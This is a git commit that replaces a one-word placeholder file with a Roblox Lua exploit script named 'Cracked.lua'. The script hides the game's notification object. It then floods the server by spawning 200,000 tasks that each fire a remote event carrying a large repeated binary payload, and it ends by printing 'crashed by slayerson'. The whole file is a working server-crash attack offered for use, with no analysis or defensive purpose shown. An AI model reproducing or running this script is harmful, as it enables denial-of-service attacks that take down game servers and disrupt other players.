ba687d4c044bbdfb9278caa459a1500c7649f4b8
TheUnknownCoder <coderobierika@gmail.com>
2025-08-14 15:01:21 -0400

    Update Cracked.lua

--- Zryopaid/Cracked.lua
+++ Zryopaid/Cracked.lua
@@ -1,1 +1,17 @@
-skids???
+print("credits Havoc") 
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Event = ReplicatedStorage:WaitForChild("ByteNetReliable")
+local Notification = ReplicatedStorage:WaitForChild("GameEvents"):FindFirstChild("Notification")
+local raw = "\n\0\0\242\165f\217\0B\0\0`yc4\232A"
+local payloadString = string.rep(raw, 520)
+if Notification then
+    Notification:Destroy()
+end
+local payload = buffer.fromstring(payloadString)
+
+for _ = 1, 200000 do
+    task.spawn(function()
+    Event:FireServer(payload)
+    end)
+end
+print("crashed by slayerson")
